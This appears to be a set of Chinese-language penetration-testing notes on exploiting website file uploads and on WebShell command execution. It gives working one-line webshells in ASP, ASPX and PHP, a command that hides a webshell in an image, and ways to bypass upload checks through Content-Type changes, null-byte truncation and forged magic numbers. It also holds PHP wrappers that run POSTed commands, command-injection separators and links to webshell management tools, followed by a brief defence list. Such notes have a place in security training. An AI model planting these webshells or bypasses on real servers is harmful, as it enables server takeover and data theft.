### 网站文件上传利用

- WebShell
  > WebShell是以ASP、PHP、JSP等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行的环境，以达到控制网址服务器的目的。
  
  **一句话WebShell**
  
  *asp*
  ```elixir
  <%eval request("value")%>
  ```
  
  *aspx*
  ```elixir
  <%@ Page Language="Jscript"%><%eval(Request.Item["value"])%>
  ```
  
  *php*
  ```php
  <?php @eval($_POST[value])?>
  // @符号的意思是不报错，因为变量value没有定义被使用，服务器会提醒变量未定义
  // 超全局变量$_GET/$_POST,使用post方法接收变量传递的字符
  // eval()把字符串作为PHP代码执行
  // exec()执行外部命令，不返回结果，可以用输出函数打印结果
  // system() 执行系统命令，返回结果
  ```
  
  制作一句话图片马
  ```sh
  copy 1.jpg/b+1.php/a 2.jgp
  ```
- 文件上传绕过
  
  a、绕过客户端检测
  > 原理：通常在上传农业面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。
  > 
  > 方法：在本地浏览器客户端禁用JS即可。利用burpsuite可以绕过一切客户端检测。
  
  b、绕过服务端检测
  
  *服务端代码检测通常检测三个点：MIME类型、文件内容、文件后缀*
  > 常见MIME类型
  > 
  > 1.超文本标记语言文本 .html text/html
  > 
  > 2.普通文本 .txt text/plain
  > 
  > 3.PDF文档 .pdf application/pdf
  > 
  > 4.Microsoft Word文件 .word application/msword
  > 
  > 5.PNG图像 .png image/png
  > 
  > 6.GIF图形 .gif image/gif
  > 
  > 7.JPEG图形 .jpeg,.jpg image/jpeg
  > 
  > 8.au声音文件 .au audio/basic
  > 
  > 9.MPEG文件 .mpg,.mpeg video/mpeg
  > 
  > 10.AVI文件 .avi video/x-msvideo
  > 
  > 11.GZIP文件 .gz application/x-gzip
  > 
  > 原理：检测图片类型文件上传过程中http头的Content-Type字段的值，来判断上传文件是否合法。
  > 
  > 方法：用burpsuite截取并修改数据包中文件的Content-Type类型进行绕过。
  
  绕过文件后缀检测
  > 服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用00阶段的方式进行绕过，报错%00截断与0x00截断。php小于5.3.29
  
  绕过文件内容检测
  > 1、通过检测上传文件内容开始处的文件幻数来判断；通常情况下，通过判断前10个字节，基本就能判断出一个文件的真实类型。
  > 
  > 2、文件加载检测；一般调用API对文件进行加载测试，常见的是图像渲染测试或二次渲染
  > 
  > 3、文件幻术检测；主要检测文件内容开始处的文件幻数(magic number)，很多文件都有幻数标志该文件的格式。
  > 
  > 绕过方法：在文件开头写上下面的值
  > 
  > jgp
  > 
  > Value = FF D8 FF E0 00 10 4A 46 49 46
  > 
  > gif
  > 
  > Value = 47 49 46 38 39 61
  > 
  > png
  > 
  > Value = 89 50 4E 47
  > 
  > 然后在文件幻数后面加上自己的一句话木马代码就行了。
- 文件上传防御
  - 文件上传的目录设置为不可执行
  - 判断文件类型
  - 使用随机数改写文件名和文件路径
  - 单独设置文件服务器的域名
- WebShell管理工具
  - 中国菜刀
    > https://github.com/Chora10/Cknife
    > 
    > https://github.com/raddyfiy/caidao-official-version
  - 蚁剑-AntSword
    > https://github.com/AntSwordProject/AntSword-Loader/releases
    > 
    > https://github.com/AntSwordProject/antSword/releases
  - 冰蝎-Behinder
    > https://github.com/rebeyond/Behinder/releases

<br/>

### WebShell命令执行

<br/>

1. 命令执行漏洞简介
   
   **原因**  *应用未对用户输入做严格检查过滤，导致用户输入的参数被当成命令来执行。*
   
   **危害**  
   ```text
   a.继承Web服务程序的权限去执行系统命令或读写文件
   b.反弹shell，获取目标服务器的权限
   c.进一步内网渗透
   ```
2. 执行函数
   - **eval**
     
     把字符串code作为PHP代码执行
     > <?php @eval($_POST['cmd']);?>
     > 
     > 注意：eval()函数传入的参数必须为PHP代码，即要以分号结尾；
     
     <br/>
   - **assert**
     
     如果参数是字符串，它将会被assert()当作PHP代码来执行
     > <?php @assert($_POST['cmd'])?>
     > 
     > assert：检查一个断言是否为FALSE
     > 
     > 注意：assert()函数是直接将传入的参数当成PHP代码执行，不需要已分号结尾
   - **call_user_func**
     ```php
     <?php
       call_user_func("assert",$_POST['cmd']);
       //传入的参数作为assert函数的参数
       //cmd=system(whoami)
     ?>
     ```
     > 第一个参数‘assert’是被调用的回调函数，其余参数是回调函数的参数
     > 
     > 把第一个参数作为回调函数调用
   - **call_user_func_array**
     ```php
     <?php 
     $cmd=$_POST['cmd'];
     $array[0]=$cmd;
     call_user_func_array("assert",$array);
     //将传入的参数作为数组的第一个值传递给assert函数
     //cmd=system(whoami)
     ?>
     ```
     
     函数功能同call_user_func，只不过参数变成数组
3. 系统命令执行
   > system()：执行外部程序，并且显示输出；
exec()：执行一个外部程序
shell_exec()：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
passthru()：执行unix系统命令并且显示原始输出
pcntl_exec()：在当前进程空间执行指定程序*
popen()：打开进程文件指针
proc_open()：执行一个命令，并且打开用来输入/输出的文件指针。
   - exec
     ```php
     <?php
     // 输出运行中的 php/httpd 进程的创建者用户名
     // （在可以执行 "whoami" 命令的系统上）
     // echo exec('whoami');
     // exec('ls -la', $return);
     // var_dump($return);
     $cmd=$_POST['cmd'];
     @exec($cmd, $return);
     var_dump($return)
     ?>
     ```
     
     exec函数可以用来执行外部程序
   - system
     ```php
     <?php
     echo '<pre>';
     
     // 输出 shell 命令 "ls" 的返回结果
     // 并且将输出的最后一样内容返回到 $last_line。
     // 将命令的返回值保存到 $retval。
     $last_line = system('ls', $retval);
     
     // 打印更多信息
     echo '
     </pre>
     <hr />Last line of the output: ' . $last_line . '
     <hr />Return value: ' . $retval;
     ?>
     ```
     
     函数执行参数所指定的命令，并且输出执行结果，system与exec的区别在于，system在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令成功则返回true，否则返回false，第二个参数与exec第三个参数含义一样。
     
     <br/>
4. 命令执行常用特殊字符
   ```text
   cmd1|cmd2：无论cmd1是否执行成功，cmd2将被执行
   cmd1;cmd2：无论cmd1是否执行成功，cmd2将被执行
   cmd1||cmd2：仅在cmd1执行失败时才执行cmd2
   cmd1&&cmd2：仅在cmd1执行成功后cmd2才执行
   cmd2$(cmd) ：echo $(whoami) 或者 $(touch test.sh; echo 'ls' > test.sh)
   'cmd'：用于执行特定命令，如 'whoami'
   ```
